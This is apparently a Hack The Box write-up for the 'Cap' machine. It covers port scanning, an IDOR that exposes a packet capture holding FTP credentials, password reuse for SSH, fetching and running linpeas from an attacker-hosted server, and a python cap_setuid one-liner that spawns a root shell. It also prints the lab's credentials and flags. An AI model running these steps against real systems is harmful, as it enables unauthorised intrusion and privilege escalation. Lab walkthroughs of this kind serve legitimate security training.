Link: [Cap](https://app.hackthebox.com/machines/Cap?sort_by=created_at&sort_type=desc)
Difficulty: Easy
OS: Linux


# Recon
Find all exisint open ports on the target with `nmap`

```
$ nmap -sV -sC -vv -p- -A -T4  10.129.20.68
<SNIP>
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Security Dashboard
<SNIP>
```

There are 3 open ports (21 : FTP, 22: SSH, and 80 : HTTP)

## Port 80 - HTTP service
<img width="1912" height="837" alt="Screenshot 2026-09-18 003618" src="https://github.com/user-attachments/assets/9e23bca9-541b-4934-ad7a-635833539366" />

Inside Dashboard, Security Snapshot allows to download the pcp file capture of the network analysis, noticing the URL endpoint 
```
/data/2
```

# Exploitation

So modifying the number value could potentially help me switch to another user session with their snapshot exposed

Reference : [IDOR](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

```
/data/0
```

Then hit the download button, `0.pcap` will be downloaded to the our attack machine 
Open wireshark to inspect the packet, in Protocol FTP number 36 and 40, the credential for FTP service is `nathan:Buck3tH4TF0RM3!`

<img width="1870" height="356" alt="Screenshot 2026-09-18 004300" src="https://github.com/user-attachments/assets/eacd38e2-3cde-4009-a463-4f0e04cc5440" />

Also, user  `nathan` does not mantain a good practice of managing password since he reuses the same password to other services such as SSH.
So either ssh to the target with obtained credentials or using FTP leads to getting `user.txt` flag in `/home/nathan` directory

```
$ cat user.txt
4efe4bc220daa3aa23ee231a0e9b82a8
```

# Post-Exploitation
Using [`linPeas.sh`](https://github.com/peass-ng/PEASS-ng/releases/download/20260916-01f8a0d0/linpeas.sh)
Starting a simple server with attack machine
```
$ sudo python3 -m http.server 1234
```

On the target machine with `nathan` logged in under SSH protocol
```
nathan@cap:~$ wget http://<AttackMachineIp>:1234/linpeas.sh
<SNIP>
nathan@cap:~$ chmod +x linpeas.sh
nathan@cap:~$ ./linpeas.sh
<SNIP>

══╣ Processes with capability sets (non-zero CapEff/CapAmb, limit 40) (T1548.001)
                                                                                                                    

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

<SNIP>
```

So the binary `/usr/bin/python3.8` has the capability to escalate the privilege to `root` session thanks to [GTFOBins](https://gtfobins.org/gtfobins/python/#shell). Here is the payload to execute it
```
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

With this payload executed, the user privilege will automatically escalated to root since the uid has been set to 0.
```
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
# whoami
root
# cd /root
# cat root.txt
625916fa5b9c32f4ec2b1441d84a1568
```

Happy Hacking@#!@#!@#

